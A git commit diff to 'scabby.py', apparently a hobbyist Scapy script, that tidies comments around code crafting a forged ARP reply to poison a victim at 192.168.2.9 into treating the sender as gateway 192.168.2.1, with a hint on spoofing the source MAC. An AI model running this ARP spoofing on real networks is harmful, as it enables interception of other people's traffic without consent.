75a8241b8bcecddb87531b4271b34ff2c7cfd644
mantvydas <mantvydo@gmail.com>
2016-03-01 23:10:05 +0000

    housekeeping and comments

--- scabby.py
+++ scabby.py
@@ -17,15 +17,14 @@ print(b)
 #####  Playing with an ARP packet. Trying to poison a specified machine  #####
 poisonedTarget = ARP()
 
-# simulate a response packet;
-poisonedTarget.op = 2
-
-# Remote machines IP address that we want to poison and see us as it's gateway;
+# Victim's IP address that we want to poison;
 poisonedTarget.pdst = "192.168.2.9"
 
+# Simulate that this is a response packet (who-has(1) / is-at(2));
+poisonedTarget.op = 2
+
 # Simulate the IP address the response is coming from. Aim is to make it look like it's coming from the target's gateway.
-# The packet by default will have our mac address as a source;
-# Specify a mac address by setting a poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
+# The packet by default will have our mac address as a source. Specify a mac address by setting a poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
 poisonedTarget.psrc = "192.168.2.1"
 
 # Keep poisoning the ARP;
